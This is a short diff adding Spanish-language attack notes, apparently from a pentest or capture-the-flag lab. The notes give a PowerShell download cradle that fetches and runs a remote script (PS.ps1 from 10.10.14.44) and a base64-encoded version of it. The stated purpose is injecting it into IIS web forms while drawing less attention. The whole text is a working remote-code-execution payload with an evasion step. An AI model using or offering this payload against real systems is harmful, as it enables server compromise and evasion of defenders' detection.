@@ -1,0 +1,4 @@
+{Esto se hace para llamar menos la atencion, esta hecho para meterlo en formularios web IIS}
+
+* Creamos un archivo que se llame data con este contenido -> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/PS.ps1')
+* Despues para encodearlo necesitaremos hacer lo siguiente -> SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAFAAUwAuAHAAcwAxACcAKQAKAA==
